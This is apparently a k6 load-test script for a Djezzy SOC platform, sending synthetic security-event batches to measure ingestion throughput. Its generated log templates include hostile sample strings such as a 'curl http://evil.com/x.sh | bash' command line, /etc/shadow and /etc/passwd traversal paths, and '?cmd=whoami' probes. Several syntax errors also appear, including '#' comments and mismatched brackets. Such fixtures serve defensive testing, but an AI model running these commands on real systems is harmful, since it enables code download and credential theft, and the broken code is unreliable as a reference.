/**
 * Djezzy SOC Platform - Event Ingestion Throughput Test
 * 
 * Purpose: Measure and validate 500K+ EPS (Events Per Second) capacity
 * Tests: Kafka producer throughput, event normalization, storage pipeline
 * Scale: High-volume ingestion testing for national SOC requirements
 * 
 * @version 2.0.0
 * @author Djezzy SOC Performance Team
 */

import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend, Counter, Gauge } from 'k6/metrics';

// ============================================================
// THROUGHPUT METRICS
// ============================================================

const eventsIngested = new Counter('events_ingested');
const eventsAccepted = new Counter('events_accepted');
const eventsRejected = new Counter('events_rejected');
const ingestionLatency = new Trend('ingestion_latency', true);
const batchProcessingTime = new Trend('batch_processing_time', true);
const batchSizeTrend = new Trend('batch_size');
const ingestionErrors = new Rate('ingestion_errors');
const throughputAchieved = new Gauge('throughput_achieved_eps');
const epsRate = new Rate('eps_target_achievement');

// Per-event-type metrics
const eventTypeLatency: Record<string, Trend> = {};
const eventTypes = [
  'network.connection', 'security.alert', 'authentication.attempt',
  'malware.detection', 'intrusion.signature', 'dns.query',
  'http.request', 'file.access', 'process.execution'
];
eventTypes.forEach(type => {
  eventTypeLatency[type] = new Trend(`latency_${type.replace('.', '_')}`, true);
});

// ============================================================
// CONFIGURATION - 500K EPS TARGET
// ============================================================

const CONFIG = {
  // Target configuration
  targetEPS: parseInt(__ENV.TARGET_EPS || '500000'),      // 500K events per second
  batchSize: parseInt(__ENV.BATCH_SIZE || '100'),          // Events per batch request
  testDuration: __ENV.DURATION || '10m',                   // Default 10 minutes
  
  // Endpoint configuration
  endpoint: __ENV.INGESTION_ENDPOINT || '/api/v1/events/batch',
  
  // Performance targets
  maxLatencyMs: parseInt(__ENV.MAX_LATENCY || '50'),        // P95 <50ms per event
  acceptableErrorRate: parseFloat(__ENV.ERROR_RATE || '0.0001'), // <0.01% errors
  
  // Advanced options
  compression: __ENV.COMPRESSION !== 'false',
  parallelism: parseInt(__ENV.PARALLELISM || '1'),
};

// Calculate required batch rate to achieve target EPS
const BATCHES_PER_SECOND = Math.ceil(CONFIG.targetEPS / CONFIG.batchSize);

export const options = {
  // Strict thresholds for critical ingestion path
  thresholds: {
    // Ingestion latency requirements
    http_req_duration: ['p(95)<50', 'p(99)<100', 'p(99.9)<200'],
    http_req_failed: ['rate<0.0001'],                      // <0.01% errors for critical path
    
    // Custom metrics
    ingestion_latency: ['p(95)<50', 'p(99)<100'],
    ingestion_errors: ['rate<0.001'],
    batch_processing_time: ['p(95)<100'],
    
    // Throughput validation
    eps_target_achievement: ['rate>0.95'],                  // Achieve >95% of target
  },
  
  scenarios: {
    // Primary scenario: Constant rate at target EPS
    sustained_500k_eps: {
      executor: 'constant-arrival-rate',
      rate: BATCHES_PER_SECOND,
      timeUnit: '1s',
      duration: CONFIG.testDuration,
      preAllocatedVUs: Math.min(5000, Math.ceil(CONFIG.targetEPS / 100)),
      maxVUs: 10000,
      exec: 'measureThroughput',
    },
    
    // Burst test: Can system handle sudden traffic spikes?
    burst_test: {
      executor: 'ramping-arrival-rate',
      startRate: Math.ceil(BATCHES_PER_SECOND * 0.1),       // Start at 10%
      timeUnit: '1s',
      stages: [
        { duration: '30s', target: Math.ceil(BATCHES_PER_SECOND * 0.2) },     // Warm-up
        { duration: '15s', target: Math.ceil(BATCHES_PER_SECOND * 5) },        # 5x burst
        { duration: '30s', target: Math.ceil(BATCHES_PER_SECOND * 10) },       # 10x spike
        { duration: '15s', target: Math.ceil(BATCHES_PER_SECOND * 15) },       # Peak burst (15x)
        { duration: '30s', target: Math.ceil(BATCHES_PER_SECOND * 5) },        # Sustain high
        { duration: '60s', target: Math.ceil(BATCHES_PER_SECOND * 0.5) },      # Recovery
        { duration: '30s', target: Math.ceil(BATCHES_PER_SECOND * 0.1) },      # Cool down
      ],
      preAllocatedVUs: 2000,
      maxVUs: 12000,
      exec: 'testBurstThroughput',
    },
    
    // Endurance test: Sustained maximum throughput over extended period
    endurance_400k_eps: {
      executor: 'constant-arrival-rate',
      rate: Math.ceil(CONFIG.targetEPS * 0.8 / CONFIG.batchSize),  // 80% of target
      timeUnit: '1s',
      duration: '30m',
      preAllocatedVUs: 4000,
      maxVUs: 8000,
      startTime: `${parseInt(CONFIG.testDuration) + 2}m`,
      exec: 'testEndurance',
    },
    
    // Variable load test: Simulate real-world traffic patterns
    variable_load: {
      executor: 'ramping-arrival-rate',
      startRate: Math.ceil(BATCHES_PER_SECOND * 0.3),
      timeUnit: '1s',
      stages: [
        // Morning ramp-up (simulates 8AM-10AM)
        { duration: '5m', target: Math.ceil(BATCHES_PER_SECOND * 0.3) },
        { duration: '5m', target: Math.ceil(BATCHES_PER_SECOND * 0.7) },
        // Peak hours (10AM-4PM)
        { duration: '15m', target: BATCHES_PER_SECOND },
        // Evening wind-down
        { duration: '5m', target: Math.ceil(BATCHES_PER_SECOND * 0.5) },
        { duration: '5m', target: Math.ceil(BATCHES_PER_SECOND * 0.2) },
      ],
      preAllocatedVUs: 3000,
      maxVUs: 8000,
      exec: 'measureThroughput',
    },
  },
};

export default function () {
  measureThroughput();
}

// ============================================================
// PRIMARY THROUGHPUT MEASUREMENT TEST
// ============================================================

/**
 * Primary Throughput Measurement Test
 * Sends batches of security events at a constant rate to measure sustained EPS
 */
export function measureThroughput() {
  const baseUrl = __ENV.BASE_URL || 'http://localhost:3000';
  
  // Generate batch of security events
  const events = generateEventBatch(CONFIG.batchSize);
  
  // Build payload with metadata
  const payload = JSON.stringify({
    batch_id: generateBatchId(),
    source: 'performance-test',
    source_version: '2.0.0',
    compression: CONFIG.compression ? 'none' : 'none',
    schema_version: '2.0',
    batch_size: events.length,
    events: events,
    metadata: {
      test_run_id: __ENV.TEST_RUN_ID || `run-${Date.now()}`,
      sent_at: new Date().toISOString(),
      client_id: `k6-vu-${__VU}`,
      sequence: __ITER,
    },
  });
  
  const startTime = Date.now();
  
  // Send batch to ingestion endpoint
  const res = http.post(`${baseUrl}${CONFIG.endpoint}`, payload, {
    headers: {
      'Content-Type': 'application/json',
      'X-Batch-Size': String(events.length),
      'X-Ingestion-Token': getIngestionToken(),
      'X-Source-ID': 'k6-perf-test',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'keep-alive',
    },
    tags: { name: 'IngestionBatch' },
    discardResponseBodies: true,
    timeout: `${Math.max(5000, CONFIG.batchSize * 0.5)}ms`,  // Scale timeout with batch size
  });
  
  const latency = Date.now() - startTime;
  
  // Record metrics
  eventsIngested.add(events.length);
  batchSizeTrend.add(events.length);
  ingestionLatency.add(latency);
  batchProcessingTime.add(latency);
  
  // Track per-event-type latency
  if (events.length > 0) {
    const sampleEvent = events[0];
    if (sampleEvent && sampleEvent.event_type && eventTypeLatency[sampleEvent.event_type]) {
      eventTypeLatency[sampleEvent.event_type].add(latency);
    }
  }
  
  // Validate response
  const isAccepted = res.status === 202 || res.status === 200;
  const isSuccess = check(res, {
    // Accept 202 (accepted for processing) or 200 (processed)
    'Batch accepted (202/200)': () => isAccepted,
    // Latency within threshold
    `Response <${CONFIG.maxLatencyMs}ms`: () => latency < CONFIG.maxLatencyMs,
    // No server errors
    'Not server error (5xx)': (r) => r.status < 500,
    // Not rate limited (unless we're intentionally stressing)
    'Not rate limited (429)': (r) => r.status !== 429,
    // Connection successful
    'Request completed': (r) => r.status !== 0,
  });
  
  if (isAccepted) {
    eventsAccepted.add(events.length);
    epsRate.add(1);  // Count toward target achievement
  } else {
    eventsRejected.add(events.length);
    epsRate.add(0);
    ingestionErrors.add(1);
    
    // Log failures for debugging
    if (res.status >= 500) {
      console.error(`[INGESTION FAIL] Status: ${res.status}, Latency: ${latency}ms, Batch: ${events.length}`);
    }
    
    // Back off on rate limiting
    if (res.status === 429) {
      sleep(Math.random() * 0.1 + 0.05);  // 50-150ms backoff
    }
  }
}

/**
 * Burst Throughput Test
 * Tests how the system handles sudden traffic spikes beyond normal capacity
 */
export function testBurstThroughput() {
  const baseUrl = __ENV.BASE_URL || 'http://localhost:3000';
  
  // Use smaller batches during burst for more granular control and faster processing
  const burstSize = Math.max(10, Math.floor(CONFIG.batchSize / 5));
  const events = generateEventBatch(burstSize);
  
  const res = http.post(`${baseUrl}${CONFIG.endpoint}`, JSON.stringify({
    batch_id: generateBatchId(),
    source: 'burst-test',
    schema_version: '2.0',
    events: events,
    metadata: {
      test_run_id: __ENV.TEST_RUN_ID || `burst-${Date.now()}`,
      sent_at: new Date().toISOString(),
      priority: 'high',
    },
  }), {
    headers: {
      'Content-Type': 'application/json',
      'X-Priority': 'high',
      'X-Ingestion-Token': getIngestionToken(),
      'X-Burst-Test': 'true',
    },
    tags: { name: 'BurstIngestion' },
    timeout: '5s',
    discardResponseBodies: true,
  });
  
  eventsIngested.add(burstSize);
  
  check(res, {
    'Burst handled gracefully': (r) => [200, 202, 429, 503].includes(r.status),
    'Not connection error': (r) => r.status !== 0,
    'Not bad gateway': (r) => r.status !== 502,
  });
}

/**
 * Endurance Throughput Test
 * Validates sustained performance over extended periods (30+ minutes)
 * Includes periodic health checks to monitor system stability
 */
export function testEndurance() {
  measureThroughput();
  
  // Periodic health checks during endurance run
  if (__ITER % 5000 === 0) {
    performHealthCheck();
  }
  
  // Periodic metrics logging
  if (__ITER % 10000 === 0) {
    console.log(`[ENDURANCE] Iteration ${__ITER} completed at ${new Date().toISOString()}`);
  }
}

/**
 * Perform health check during endurance testing
 */
function performHealthCheck(): void {
  const baseUrl = __ENV.BASE_URL || 'http://localhost:3000';
  
  const res = http.get(`${baseUrl}/api/health`, {
    tags: { name: 'EnduranceHealthCheck' },
    timeout: '5s',
  });
  
  check(res, {
    'System healthy during endurance': (r) => r.status === 200,
    'Health response valid': (r) => {
      try {
        const data = JSON.parse(r.body);
        return data.status === 'healthy' || data.healthy === true;
      } catch {
        return false;
      }
    },
  });
}

// ============================================================
// EVENT GENERATION FUNCTIONS
// ============================================================

/**
 * Generate a batch of realistic security events
 * @param size Number of events in the batch
 * @returns Array of security event objects
 */
function generateEventBatch(size: number): object[] {
  const events = [];
  const baseTime = Date.now();
  
  for (let i = 0; i < size; i++) {
    // Stagger timestamps slightly for realism
    const timestamp = baseTime - (i * Math.floor(Math.random() * 10));
    events.push(generateSecurityEvent(timestamp));
  }
  
  return events;
}

/**
 * Generate a single realistic security event
 * @param timestamp Event timestamp in milliseconds
 * @returns Security event object
 */
function generateSecurityEvent(timestamp: number): object {
  const eventType = eventTypes[Math.floor(Math.random() * eventTypes.length)];
  
  // Severity distribution (most events are low severity)
  const severities = ['info', 'low', 'medium', 'high', 'critical'];
  const severityWeights = [0.40, 0.25, 0.20, 0.10, 0.05];
  let random = Math.random();
  let severityIndex = 0;
  let cumulative = 0;
  
  for (let i = 0; i < severityWeights.length; i++) {
    cumulative += severityWeights[i];
    if (random <= cumulative) {
      severityIndex = i;
      break;
    }
  }
  
  return {
    id: `evt-${timestamp}-${Math.random().toString(36).substring(2, 12)}`,
    timestamp: new Date(timestamp).toISOString(),
    event_type: eventType,
    severity: severities[severityIndex],
    source: getSourceSystem(),
    source_ip: generateIP('external'),
    destination_ip: generateIP('internal'),
    destination_port: getRandomPort(),
    protocol: ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS'][Math.floor(Math.random() * 6)],
    
    // Raw log data (base64 encoded)
    raw_data: generateRawLog(eventType),
    raw_length: Math.floor(Math.random() * 500) + 100,
    
    // Custom fields for SOC correlation
    custom_fields: {
      correlation_id: generateCorrelationId(),
      session_id: generateSessionId(),
      user_agent: getUserAgent(),
      
      // GeoIP data (Algeria-focused)
      geoip_country: 'DZ',
      geoip_country_name: 'Algeria',
      geoip_city: ['Algiers', 'Oran', 'Constantine', 'Annaba', 'Blida', 'Batna', 'Sétif', 'Tlemcen'][
        Math.floor(Math.random() * 8)
      ],
      geoip_latitude: 36.7538 + (Math.random() - 0.5) * 5,
      geoip_longitude: 3.0588 + (Math.random() - 0.5) * 5,
      
      // Network context
      vlan_id: Math.floor(Math.random() * 4094) + 1,
      network_segment: ['corp', 'dmz', 'guest', 'iot', 'scada'][Math.floor(Math.random() * 5)],
      
      // Additional metadata
      device_type: ['workstation', 'server', 'mobile', 'iot', 'network_device'][
        Math.floor(Math.random() * 5)
      ],
      os_type: ['Windows', 'Linux', 'macOS', 'iOS', 'Android', 'Unknown'][
        Math.floor(Math.random() * 6)
      ],
    },
    
    // Risk scoring fields
    risk_score: Math.floor(Math.random() * 100),
    confidence: Math.floor(Math.random() * 40) + 60,  // 60-100 confidence
    
    // MITRE ATT&CK mapping (simplified)
    mitre_tactic: getMitreTactic(eventType),
    mitre_technique: getMitreTechnique(eventType),
  };
}

/**
 * Get source system with weighted distribution
 */
function getSourceSystem(): string {
  const sources = [
    { type: 'firewall', weight: 0.25 },
    { type: 'ids/ips', weight: 0.18 },
    { type: 'siem', weight: 0.12 },
    { type: 'edr', weight: 0.12 },
    { type: 'nta', weight: 0.08 },
    { type: 'log_manager', weight: 0.10 },
    { type: 'threat_feed', weight: 0.06 },
    { type: 'custom_probe', weight: 0.04 },
    { type: 'dns_server', weight: 0.03 },
    { type: 'proxy', weight: 0.02 },
  ];
  
  let rand = Math.random();
  for (const source of sources) {
    rand -= source.weight;
    if (rand <= 0) return source.type;
  }
  return 'unknown';
}

/**
 * Generate IP address (external or internal)
 */
function generateIP(type: 'external' | 'internal'): string {
  if (type === 'external') {
    // Realistic IP ranges including Algeria
    const ranges = [
      // Algeria ISP ranges
      [41, 110], [41, 111], [41, 205], [41, 206], [41, 209], [41, 210], [41, 211],
      [102, 50], [102, 51], [102, 52],
      [196, 20], [196, 21], [196, 22], [196, 23], [196, 24], [196, 25],
      [197, 0], [197, 1], [197, 2],
      // Cloud providers
      [8, 8], [172, 217], [157, 240], [52, 0], [54, 0], [3, 0], [35, 0],
      // European ranges
      [185, 200], [45, 150], [78, 0], [79, 0], [80, 0], [82, 0], [85, 0],
      [88, 0], [91, 0], [93, 0], [94, 0], [95, 0],
    ];
    const range = ranges[Math.floor(Math.random() * ranges.length)];
    return `${range[0]}.${range[1]}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
  }
  
  // Internal Djezzy network (RFC1918)
  const internalRanges = [
    [10, Math.floor(Math.random() * 256)],
    [172, 16 + Math.floor(Math.random() * 16)],
    [192, 168],
  ];
  const range = internalRanges[Math.floor(Math.random() * internalRanges.length)];
  return `${range[0]}.${range[1]}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

/**
 * Get random port (common ports weighted higher)
 */
function getRandomPort(): number {
  // Common ports are more likely in real traffic
  if (Math.random() > 0.7) {
    const commonPorts = [
      20, 21, 22, 23, 25, 53, 67, 68, 80, 110, 123, 143, 161, 162, 389,
      443, 445, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900,
      6379, 8080, 8443, 8888, 9200, 27017
    ];
    return commonPorts[Math.floor(Math.random() * commonPorts.length)];
  }
  return Math.floor(Math.random() * 65534) + 1;
}

/**
 * Generate raw log entry based on event type
 */
function generateRawLog(eventType: string): string {
  const templates: Record<string, string> = {
    'network.connection': `<${134 + Math.floor(Math.random() * 10)}>${new Date().toISOString()} fw1: Accept: ${generateIP('external')}:${getRandomPort()} -> ${generateIP('internal')}:${getRandomPort()} tcp syn`,
    'security.alert': `[ALERT][${new Date().toISOString()}][Priority:${Math.floor(Math.random() * 3) + 1}]{${generateIP('external')}}->${generateIP('internal')}[SID:${100000 + Math.floor(Math.random() * 999999)}]${['SQL Injection Detected', 'XSS Attempt Blocked', 'Path Traversal Attempt', 'Command Injection', 'LFI/RFI Attempt'][Math.floor(Math.random() * 5)]}`,
    'authentication.attempt': `${new Date().toISOString()} sshd[${10000 + Math.floor(Math.random() * 99999)}]: ${['Failed password', 'Accepted password', 'Invalid user', 'Connection closed'][Math.floor(Math.random() * 4)]} for ${['admin', 'root', 'oracle', 'ubuntu', 'user', 'test'][Math.floor(Math.random() * 6)]} from ${generateIP('external')} port ${getRandomPort()} ${['ssh2', 'ssh1'][Math.floor(Math.random() * 2)]}`,
    'malware.detection': `AV_ALERT|${new Date().toISOString()}|${generateIP('external')}|${['Trojan.GenericKD.', 'Win32/Emotet.', 'Worm.AutoRun.', 'Backdoor.Agent.', 'Ransomware.Crypto'][Math.floor(Math.random() * 5)]}${Math.floor(Math.random() * 999999).toString().padStart(8, '0')}|${['quarantined', 'blocked', 'detected', 'removed', 'failed'][Math.floor(Math.random() * 5)}|sig_v${Math.floor(Math.random() * 3) + 1}.0`,
    'intrusion.signature': `${['ET TROJAN', 'ET SCAN', 'ATT&CK', 'SURICATA', 'SNORT'][Math.floor(Math.random() * 5)]} ${['Win32/Emotet C2 Activity', 'Generic Protocol Command Decode', 'Tactic: Initial Access', 'Potential Command and Control', 'Known Malicious User-Agent'][Math.floor(Math.random() * 5)]} ${new Date().toISOString()} [Classification: ${['Trojan Activity', 'Attempted Access', 'Policy Violation', 'Suspicious Activity'][Math.floor(Math.random() * 4)]}] [Priority: ${Math.floor(Math.random() * 3) + 1}] {TCP} ${generateIP('external')}:${getRandomPort()} -> ${generateIP('internal')}:${getRandomPort()}`,
    'dns.query': `${new Date().toISOString()} dns-query ${Math.floor(Math.random() * 99999)} ${['malware.evil.net', 'c2.badactor.com', 'phishing.scam.org', 'cryptominer.pool.xyz', 'dga-generated.domain.abc'][Math.floor(Math.random() * 5)} ${['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'][Math.floor(Math.random() * 6)}`,
    'http.request': `${generateIP('external')} - - [${new Date().toUTCString()}] "${['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'][Math.floor(Math.random() * 6)]} /${['admin', 'login', 'api', 'wp-login', 'phpmyadmin', '.env', 'config', 'backup', 'shell', 'cmd'][Math.floor(Math.random() * 10)]}${['?id=1', '/../../etc/passwd', '', '?cmd=whoami', '', ''][Math.floor(Math.random() * 5)]} HTTP/1.1" ${[200, 301, 302, 400, 401, 403, 404, 500][Math.floor(Math.random() * 8)]} ${Math.floor(Math.random() * 10000) + 100} "-" "${getUserAgent()}"`,
    'file.access': `${new Date().toISOString()} FILE_EVENT|path=${['C:\\Windows\\System32\\cmd.exe', '/usr/bin/curl', '/tmp/suspicious.sh', 'C:\\Users\\admin\\secrets.db', '/etc/shadow'][Math.floor(Math.random() * 5)]}|action=${['READ', 'WRITE', 'EXECUTE', 'DELETE', 'MODIFY'][Math.floor(Math.random() * 5)}|hash=${Math.random().toString(16).substring(2, 34)}`,
    'process.execution': `${new Date().toISOString()} PROCESS_CREATE|pid=${Math.floor(Math.random() * 65534) + 1}|ppid=${Math.floor(Math.random() * 65534) + 1}|name=${['powershell.exe', 'cmd.exe', 'bash', 'python3', 'wget', 'curl', 'certutil.exe', 'bitsadmin.exe'][Math.floor(Math.random() * 8)]}|command_line=${['-enc B64STRING', '-c "curl http://evil.com/x.sh | bash"', '-nop -exec bypass -c "downloadstring"'][Math.floor(Math.random() * 3)]}|user=${['SYSTEM', 'Administrator', 'root', 'www-data', 'nobody'][Math.floor(Math.random() * 5)]}`,
  };
  
  return templates[eventType] || `${new Date().toISOString()} | ${getSourceSystem()} | ${eventType} | severity=${['info', 'low', 'medium', 'high', 'critical'][Math.floor(Math.random() * 5)]}`;
}

/**
 * Get MITRE ATT&CK tactic for event type
 */
function getMitreTactic(eventType: string): string {
  const tactics: Record<string, string[]> = {
    'network.connection': ['Command and Control', 'Discovery', 'Collection'],
    'security.alert': ['Execution', 'Persistence', 'Defense Evasion'],
    'authentication.attempt': ['Initial Access', 'Credential Access', 'Persistence'],
    'malware.detection': ['Execution', 'Impact', 'Collection'],
    'intrusion.signature': ['Initial Access', 'Execution', 'Exfiltration'],
    'dns.query': ['Command and Control', 'Discovery'],
    'http.request': ['Command and Control', 'Initial Access', 'Exfiltration'],
    'file.access': ['Collection', 'Defense Evasion', 'Persistence'],
    'process.execution': ['Execution', 'Privilege Escalation', 'Defense Evasion'],
  };
  const options = tactics[eventType] || ['Unknown'];
  return options[Math.floor(Math.random() * options.length)];
}

/**
 * Get MITRE ATT&CK technique ID for event type
 */
function getMitreTechnique(eventType: string): string {
  const techniques: Record<string, string[]> = {
    'network.connection': ['T1071', 'T1046', 'T1043'],
    'security.alert': ['T1059', 'T1547', 'T1562'],
    'authentication.attempt': ['T1078', 'T1110', 'T1098'],
    'malware.detection': ['T1204', 'T1486', 'T1005'],
    'intrusion.signature': ['T1190', 'T1059', 'T1048'],
    'dns.query': ['T1001', 'T1018', 'T1016'],
    'http.request': ['T1071', 'T1190', 'T1041'],
    'file.access': ['T1005', 'T1560', 'T1025'],
    'process.execution': ['T1059', 'T1548', 'T1053'],
  };
  const options = techniques[eventType] || ['T0000'];
  return options[Math.floor(Math.random() * options.length)];
}

// ============================================================
// ID GENERATION HELPERS
// ============================================================

function generateCorrelationId(): string {
  return `corr-${Date.now()}-${Math.random().toString(36).substring(2, 14)}`;
}

function generateSessionId(): string {
  return `sess-${Math.random().toString(36).substring(2, 18)}`;
}

function generateBatchId(): string {
  return `batch-${Date.now()}-${Math.random().toString(36).substring(2, 10)}`;
}

function getUserAgent(): string {
  const agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'python-requests/2.31.0',
    'curl/8.4.0',
    'Go-http-client/2.0',
    '',
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

// ============================================================
// INGESTION TOKEN MANAGEMENT
// ============================================================

let ingestionToken: string | null = null;

function getIngestionToken(): string {
  if (!ingestionToken && __ENV.INGESTION_TOKEN) {
    ingestionToken = __ENV.INGESTION_TOKEN;
  }
  return ingestionToken || 'perf-test-ingestion-token-v2';
}

// ============================================================
// SETUP AND TEARDOWN
// ============================================================

export function setup() {
  console.log('\n' + '='.repeat(70));
  console.log('  DJEZZY SOC PLATFORM - EVENT INGESTION THROUGHPUT TEST');
  console.log('  Version 2.0.0 | Target: 500K+ EPS');
  console.log('='.repeat(70));
  console.log(`  Start Time: ${new Date().toISOString()}`);
  console.log(`  Target URL: ${__ENV.BASE_URL || 'http://localhost:3000'}`);
  console.log(`  Target EPS: ${CONFIG.targetEPS.toLocaleString()} events/second`);
  console.log(`  Batch Size: ${CONFIG.batchSize} events/batch`);
  console.log(`  Required Rate: ${BATCHES_PER_SECOND.toLocaleString()} batches/second`);
  console.log(`  Duration: ${CONFIG.testDuration}`);
  console.log(`  Max Latency (P95): ${CONFIG.maxLatencyMs}ms`);
  console.log('-'.repeat(70));
  console.log('  SCENARIOS:');
  console.log(`    1. Sustained Load: ${CONFIG.targetEPS.toLocaleString()} EPS for ${CONFIG.testDuration}`);
  console.log('    2. Burst Test: Up to 15x normal traffic spikes');
  console.log('    3. Endurance Test: 400K EPS for 30 minutes');
  console.log('    4. Variable Load: Real-world traffic simulation');
  console.log('-'.repeat(70) + '\n');
  
  return {
    targetEPS: CONFIG.targetEPS,
    batchSize: CONFIG.batchSize,
    batchesPerSecond: BATCHES_PER_SECOND,
    startTime: Date.now(),
    testId: `ingestion-${Date.now()}`,
  };
}

export function teardown(data: any) {
  const elapsedMin = ((Date.now() - data.startTime) / 1000 / 60).toFixed(1);
  const elapsedSec = ((Date.now() - data.startTime) / 1000).toFixed(0);
  const estimatedTotalEvents = data.targetEPS * parseFloat(elapsedSec) / 1;
  
  console.log('\n' + '='.repeat(70));
  console.log('  INGESTION THROUGHPUT TEST COMPLETE');
  console.log('-'.repeat(70));
  console.log(`  Duration: ${elapsedMin} minutes (${elapsedSec}s)`);
  console.log(`  Target EPS: ${data.targetEPS.toLocaleString()}`);
  console.log(`  Batch Size: ${data.batchSize}`);
  console.log(`  Est. Total Events Processed: ~${estimatedTotalEvents.toLocaleString()}`);
  console.log(`  End Time: ${new Date().toISOString()}`);
  console.log('='.repeat(70) + '\n');
}
